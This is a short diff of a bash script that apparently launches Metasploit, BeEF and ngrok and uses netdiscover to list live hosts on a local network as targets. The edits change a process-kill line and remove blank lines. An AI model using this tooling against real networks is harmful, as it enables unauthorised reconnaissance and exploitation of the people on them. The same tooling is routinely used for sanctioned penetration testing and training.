@@ -63,7 +63,7 @@ if [[ -z "$LAN" ]]; then
 fi
 
 # --- Kill previous BeEF/Metasploit processes ---
-pkill -f 'ngrok|ruby|msfconsole|beef' 2>/dev/null
+pkill -f 'ngrok|ruby|msfconsole';wait
 
 # --- Start Metasploit ---
 color_print GREEN "[*] Starting Metasploit..."
@@ -115,14 +115,11 @@ cd /usr/share/beef-xss && ./beef -x &>/dev/null &
 
 # --- Discover clients with netdiscover ---
 color_print CYAN "[*] Scanning for live hosts on network ($IFACE)..."
-
 LIVE_HOSTS=$(mktemp)
-
 timeout 30s netdiscover -P > "$LIVE_HOSTS"
 
 color_print GREEN "[*] Live Clients Detected:"
 awk '/^[0-9]/ {printf "  IP: %-15s  MAC: %-18s  Vendor: %s\n", $1, $2, $3}' "$LIVE_HOSTS"
-
 NETDISCOVER_IPS=$(awk '/^[0-9]/ {print $1}' "$LIVE_HOSTS" | grep -v "$LAN" | paste -sd ',' -)
 
 if [[ -z "$NETDISCOVER_IPS" ]]; then
